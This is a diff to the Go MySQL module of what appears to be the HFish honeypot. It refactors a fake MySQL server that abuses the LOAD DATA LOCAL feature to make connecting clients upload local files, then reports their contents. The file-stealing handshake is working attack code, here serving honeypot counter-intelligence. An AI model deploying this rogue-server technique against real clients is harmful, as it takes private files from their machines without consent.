@@ -3,13 +3,16 @@ package mysql
 import (
 	"bytes"
 	"encoding/binary"
-	"fmt"
-	"log"
 	"net"
 	"syscall"
 	"strings"
 	"HFish/error"
 	"HFish/core/report"
+	"HFish/utils/try"
+	"HFish/utils/log"
+	"HFish/utils/is"
+	"HFish/core/rpc/client"
+	"strconv"
 )
 
 //读取文件时每次读取的字节数
@@ -37,8 +40,6 @@ var fileNames []string
 var recordClient = make(map[string]int)
 
 func Start(addr string, files string) {
-	fmt.Println("mysql启动...")
-
 	// 启动 Mysql 服务端
 	serverAddr, _ := net.ResolveTCPAddr("tcp", addr)
 	listener, _ := net.ListenTCP("tcp", serverAddr)
@@ -74,40 +75,62 @@ func connectionClientHandler(conn net.Conn) {
 	connFrom := conn.RemoteAddr().String()
 
 	arr := strings.Split(connFrom, ":")
-	id := report.ReportMysql(arr[0], connFrom+" 已经连接")
 
-	var ibuf = make([]byte, bufLength)
-	//第一个包
-	_, err := conn.Write(GreetingData)
-	error.Check(err, "")
+	// 判断是否为 RPC 客户端
+	var id string
 
-	//第二个包
-	_, err = conn.Read(ibuf[0: bufLength-1])
-
-	//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
-	if (uint8(ibuf[4]) & uint8(128)) == 0 {
-		_ = conn.Close()
-		log.Println("The client not support LOAD DATA LOCAL")
-		return
+	if is.Rpc() {
+		id = client.ReportResult("MYSQL", "", arr[0], connFrom+" 已经连接", "0")
+	} else {
+		id = strconv.FormatInt(report.ReportMysql(arr[0], "本机", connFrom+" 已经连接"), 10)
 	}
-	//第三个包
-	_, err = conn.Write(OkData)
 
-	//第四个包
-	_, err = conn.Read(ibuf[0: bufLength-1])
+	log.Pr("Mysql", arr[0], "已经连接")
 
-	//这里根据客户端连接的次数来选择读取文件列表里面的第几个文件
-	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
-	getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
-	getFileData = append(getFileData, fileNames[recordClient[ip]]...)
+	try.Try(func() {
+		var ibuf = make([]byte, bufLength)
 
-	//第五个包
-	_, err = conn.Write(getFileData)
-	getRequestContent(conn, id)
+		//第一个包
+		_, err := conn.Write(GreetingData)
+		error.Check(err, "")
+
+		//第二个包
+		_, err = conn.Read(ibuf[0: bufLength-1])
+
+		//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
+		if (uint8(ibuf[4]) & uint8(128)) == 0 {
+			_ = conn.Close()
+			return
+		}
+		//第三个包
+		_, err = conn.Write(OkData)
+
+		//第四个包
+		_, err = conn.Read(ibuf[0: bufLength-1])
+
+		//这里根据客户端连接的次数来选择读取文件列表里面的第几个文件
+		ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
+		getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
+		getFileData = append(getFileData, fileNames[recordClient[ip]]...)
+
+		//第五个包
+		_, err = conn.Write(getFileData)
+		getRequestContent(conn, id)
+
+	}).Catch(func() {
+		log.Pr("Mysql", arr[0], "该客户端正在使用扫描器扫描")
+
+		if is.Rpc() {
+			go client.ReportResult("MYSQL", "", "", "&&该客户端正在使用扫描器扫描", id)
+		} else {
+			// 有扫描器扫描
+			go report.ReportUpdateMysql(id, "&&该客户端正在使用扫描器扫描")
+		}
+	})
 }
 
 //获取客户端传来的文件数据
-func getRequestContent(conn net.Conn, id int64) {
+func getRequestContent(conn net.Conn, id string) {
 	var content bytes.Buffer
 	//先读取数据包长度，前面3字节
 	lengthBuf := make([]byte, 3)
@@ -116,7 +139,6 @@ func getRequestContent(conn net.Conn, id int64) {
 
 	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
 	if totalDataLength == 0 {
-		log.Println("Get no file and closed connection.")
 		return
 	}
 	//然后丢掉1字节的序列号
@@ -128,7 +150,6 @@ func getRequestContent(conn net.Conn, id int64) {
 		length, err := conn.Read(ibuf)
 		switch err {
 		case nil:
-			log.Println("Get file and reading...")
 			//如果本次读取的内容长度+之前读取的内容长度大于文件内容总长度，则本次读取的文件内容只能留下一部分
 			if length+totalReadLength > totalDataLength {
 				length = totalDataLength - totalReadLength
@@ -144,13 +165,18 @@ func getRequestContent(conn net.Conn, id int64) {
 		case syscall.EAGAIN: // try again
 			continue
 		default:
-			log.Println("Closed connection: ", conn.RemoteAddr().String())
+			arr := strings.Split(conn.RemoteAddr().String(), ":")
+			log.Pr("Mysql", arr[0], "已经关闭连接")
 			return
 		}
 	}
 }
 
-//保存文件
-func getFileContent(content bytes.Buffer, id int64) {
-	report.ReportUpdateMysql(id, "&&"+content.String())
+// 获取文件内容
+func getFileContent(content bytes.Buffer, id string) {
+	if is.Rpc() {
+		go client.ReportResult("MYSQL", "", "", "&&"+content.String(), id)
+	} else {
+		go report.ReportUpdateMysql(id, "&&"+content.String())
+	}
 }
